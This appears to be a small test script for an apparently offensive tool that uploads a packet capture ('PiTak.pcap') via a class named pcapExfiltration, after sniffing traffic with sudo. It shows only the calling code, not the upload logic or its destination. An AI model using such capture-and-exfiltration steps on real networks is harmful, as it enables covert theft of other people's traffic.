from exfiltration import pcapExfiltration

# Requires the .pcap file to be present otherwise will fail
# Run "sudo python3 snifferClassTest.py" and uncomment the .sniffToFile() line
a = pcapExfiltration("../../PiTak.pcap")
a.upload()